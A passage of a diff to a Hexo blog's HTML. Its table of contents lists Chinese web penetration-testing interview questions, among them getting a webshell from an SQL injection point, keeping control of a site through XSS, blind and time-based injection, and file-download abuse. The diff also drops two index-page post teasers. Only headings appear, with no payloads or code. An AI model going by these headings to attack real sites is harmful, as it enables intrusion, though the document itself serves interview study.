href="#25-%E7%9B%AE%E6%A0%87%E7%AB%99%E5%8F%91%E7%8E%B0%E6%9F%90txt%E7%9A%84%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%E4%B8%BAhttp-www-test-com-down-down-php-file-upwdown-1-txt%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-number">1.0.25.</span> <span class="toc-text">25.目标站发现某txt的下载地址为http:&#x2F;&#x2F;www.test.com&#x2F;down&#x2F;down.php?file&#x3D;&#x2F;upwdown&#x2F;1.txt，你有什么思路？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#26-%E7%94%B2%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AA%E7%9B%AE%E6%A0%87%E7%AB%99%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%91%8A%E8%AF%89%E4%BD%A0%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%AD%98%E5%9C%A8-abc-%E7%9B%AE%E5%BD%95%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%AD%A4%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%AD%98%E5%9C%A8%E7%BC%96%E8%BE%91%E5%99%A8%E5%92%8Cadmin%E7%9B%AE%E5%BD%95%E3%80%82%E8%AF%B7%E9%97%AE%E4%BD%A0%E7%9A%84%E6%83%B3%E6%B3%95%E6%98%AF%EF%BC%9F"><span class="toc-number">1.0.26.</span> <span class="toc-text">26.甲给你一个目标站，并且告诉你根目录下存在&#x2F;abc&#x2F;目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#27-%E5%9C%A8%E6%9C%89shell%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8xss%E5%AE%9E%E7%8E%B0%E5%AF%B9%E7%9B%AE%E6%A0%87%E7%AB%99%E7%9A%84%E9%95%BF%E4%B9%85%E6%8E%A7%E5%88%B6%EF%BC%9F"><span class="toc-number">1.0.27.</span> <span class="toc-text">27.在有shell的情况下，如何使用xss实现对目标站的长久控制？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#28-%E5%90%8E%E5%8F%B0%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E5%A4%84%EF%BC%8C%E5%8E%9F%E5%AF%86%E7%A0%81%E6%98%BE%E7%A4%BA%E4%B8%BA-%E3%80%82%E4%BD%A0%E8%A7%89%E5%BE%97%E8%AF%A5%E6%80%8E%E6%A0%B7%E5%AE%9E%E7%8E%B0%E8%AF%BB%E5%87%BA%E8%BF%99%E4%B8%AA%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%9F"><span class="toc-number">1.0.28.</span> <span class="toc-text">28.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#29-%E7%9B%AE%E6%A0%87%E7%AB%99%E6%97%A0%E9%98%B2%E6%8A%A4%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8%E8%AE%BF%E9%97%AE%EF%BC%8C%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC%E6%A0%BC%E5%BC%8F%E8%AE%BF%E9%97%AE%E5%88%99403-%E4%BB%80%E4%B9%88%E5%8E%9F%E5%9B%A0%EF%BC%9F"><span class="toc-number">1.0.29.</span> <span class="toc-text">29.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#30-%E5%AE%A1%E6%9F%A5%E5%85%83%E7%B4%A0%E5%BE%97%E7%9F%A5%E7%BD%91%E7%AB%99%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84%E9%98%B2%E6%8A%A4%E8%BD%AF%E4%BB%B6%EF%BC%8C%E4%BD%A0%E8%A7%89%E5%BE%97%E6%80%8E%E6%A0%B7%E5%81%9A%E5%88%B0%E7%9A%84%EF%BC%9F"><span class="toc-number">1.0.30.</span> <span class="toc-text">30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#31-%E5%9C%A8win2003%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E5%BB%BA%E7%AB%8B%E4%B8%80%E4%B8%AA-zhongzi%E6%96%87%E4%BB%B6%E5%A4%B9%E7%94%A8%E6%84%8F%E4%BD%95%E4%B8%BA%EF%BC%9F"><span class="toc-number">1.0.31.</span> <span class="toc-text">31.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#32%E3%80%81sql%E6%B3%A8%E5%85%A5%E6%9C%89%E4%BB%A5%E4%B8%8B%E4%B8%A4%E4%B8%AA%E6%B5%8B%E8%AF%95%E9%80%89%E9%A1%B9%EF%BC%8C%E9%80%89%E4%B8%80%E4%B8%AA%E5%B9%B6%E4%B8%94%E9%98%90%E8%BF%B0%E4%B8%8D%E9%80%89%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%9A%84%E7%90%86%E7%94%B1%EF%BC%9A"><span class="toc-number">1.0.32.</span> <span class="toc-text">32、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#33%E3%80%81%E4%BB%A5%E4%B8%8B%E9%93%BE%E6%8E%A5%E5%AD%98%E5%9C%A8-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%AF%B9%E4%BA%8E%E8%BF%99%E4%B8%AA%E5%8F%98%E5%BD%A2%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-number">1.0.33.</span> <span class="toc-text">33、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#34%E3%80%81%E5%8F%91%E7%8E%B0-demo-jsp-uid-110-%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E4%BD%A0%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF%E8%8E%B7%E5%8F%96-webshell%EF%BC%8C%E5%93%AA%E7%A7%8D%E6%98%AF%E4%BC%98%E9%80%89%EF%BC%9F"><span class="toc-number">1.0.34.</span> <span class="toc-text">34、发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#35%E3%80%81CSRF-%E5%92%8C-XSS-%E5%92%8C-XXE-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">1.0.35.</span> <span class="toc-text">35、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#36%E3%80%81CSRF%E3%80%81SSRF%E5%92%8C%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">1.0.36.</span> <span class="toc-text">36、CSRF、SSRF和重放攻击有什么区别？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#37%E3%80%81%E8%AF%B4%E5%87%BA%E8%87%B3%E5%B0%91%E4%B8%89%E7%A7%8D%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">1.0.37.</span> <span class="toc-text">37、说出至少三种业务逻辑漏洞，以及修复方式？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#38%E3%80%81%E5%9C%88%E5%87%BA%E4%B8%8B%E9%9D%A2%E4%BC%9A%E8%AF%9D%E4%B8%AD%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98%E7%9A%84%E9%A1%B9%EF%BC%8C%E5%B9%B6%E6%A0%87%E6%B3%A8%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-number">1.0.38.</span> <span class="toc-text">38、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#39%E3%80%81%E6%89%BE%E4%B8%80%E7%B1%BB%E4%BD%A0%E6%9C%80%E6%93%85%E9%95%BF%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E8%B0%88%E4%B8%8B%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%90%8E%E7%9A%84%E6%96%B9%E6%A1%88%EF%BC%9F"><span class="toc-number">1.0.39.</span> <span class="toc-text">39、找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-%E7%A7%81%E4%BA%BA%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93%E5%86%85%E5%AE%B9"><span class="toc-number">2.</span> <span class="toc-text">二. 私人面试总结内容</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%EF%BC%8C%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E4%BD%A0%E6%98%AF%E5%A6%82%E4%BD%95%E6%9D%A5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84"><span class="toc-number">2.0.1.</span> <span class="toc-text">一，给你一个网站你是如何来渗透测试的?</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8Cnmap%EF%BC%8C%E6%89%AB%E6%8F%8F%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">2.0.2.</span> <span class="toc-text">二，nmap，扫描的几种方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E7%B1%BB%E5%9E%8B%EF%BC%9F"><span class="toc-number">2.0.3.</span> <span class="toc-text">三，sql注入的几种类型？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%9B%EF%BC%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%BD%E6%95%B0%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F10%E4%B8%AA"><span class="toc-number">2.0.4.</span> <span class="toc-text">四，报错注入的函数有哪些？10个</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%94%EF%BC%8C%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E6%9D%A5%E5%88%A4%E6%96%AD%EF%BC%9F"><span class="toc-number">2.0.5.</span> <span class="toc-text">五，延时注入如何来判断？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%AD%EF%BC%8C%E7%9B%B2%E6%B3%A8%E5%92%8C%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B1%E5%90%8C%E7%82%B9%EF%BC%9F"><span class="toc-number">2.0.6.</span> <span class="toc-text">六，盲注和延时注入的共同点？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%83%EF%BC%8C%E5%A6%82%E4%BD%95%E6%8B%BF%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84webshell%EF%BC%9F"><span class="toc-number">2.0.7.</span> <span class="toc-text">七，如何拿一个网站的webshell？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%AB%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E5%86%99%E6%96%87%E4%BB%B6%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%9F"><span class="toc-number">2.0.8.</span> <span class="toc-text">八，sql注入写文件都有哪些函数？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B9%9D%EF%BC%8C%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF"><span class="toc-number">2.0.9.</span> <span class="toc-text">九，如何防止CSRF?</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8D%81%EF%BC%8Cowasp-%E6%BC%8F%E6%B4%9E%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">2.0.10.</span> <span class="toc-text">十，owasp 漏洞都有哪些？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">2.0.11.</span> <span class="toc-text">十一：SQL注入防护方法？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%EF%BC%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">2.0.12.</span> <span class="toc-text">十二，代码执行，文件读取，命令执行的函数都有哪些？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%EF%BC%8Cimg%E6%A0%87%E7%AD%BE%E9%99%A4%E4%BA%86onerror%E5%B1%9E%E6%80%A7%E5%A4%96%EF%BC%8C%E8%BF%98%E6%9C%89%E5%85%B6%E4%BB%96%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B7%AF%E5%BE%84%E7%9A%84%E5%8A%9E%E6%B3%95%E5%90%97%EF%BC%9F"><span class="toc-number">2.0.13.</span> <span class="toc-text">十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%EF%BC%8Cimg%E6%A0%87%E7%AD%BE%E9%99%A4%E4%BA%86onerror%E5%B1%9E%E6%80%A7%E5%A4%96%EF%BC%8C%E5%B9%B6%E4%B8%94src%E5%B1%9E%E6%80%A7%E7%9A%84%E5%90%8E%E7%BC%80%E5%90%8D%EF%BC%8C%E5%BF%85%E9%A1%BB%E4%BB%A5-jpg%E7%BB%93%E5%B0%BE%EF%BC%8C%E6%80%8E%E4%B9%88%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B7%AF%E5%BE%84%E3%80%82"><span class="toc-number">2.0.14.</span> <span class="toc-text">十四，img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
 
-  
-    <article id="post-Python基础" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/10/27/Python%E5%9F%BA%E7%A1%80/" target="_blank">Python基础学习笔记</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/10/27/Python%E5%9F%BA%E7%A1%80/" class="archive-article-date">
-        <time datetime="2020-10-27T11:30:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-27</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="Python-基础入门学习"><a href="#Python-基础入门学习" class="headerlink" title="Python 基础入门学习"></a>Python 基础入门学习</h2><p>Python的一些基础语法学习笔记</p>
-    
-    <a class="article-more-a" href="/2020/10/27/Python%E5%9F%BA%E7%A1%80/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">语言</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/10/27/Python%E5%9F%BA%E7%A1%80/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
 
 
 
 
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/10/27/hello-world/" target="_blank">Hello World</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/10/27/hello-world/" class="archive-article-date">
-        <time datetime="2020-10-27T10:32:17.722Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-27</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-    
-    <a class="article-more-a" href="/2020/10/27/hello-world/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/10/27/hello-world/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
 
 
 
 
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-    </nav>
-  
 
 
           </div>
@@ -936,8 +554,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
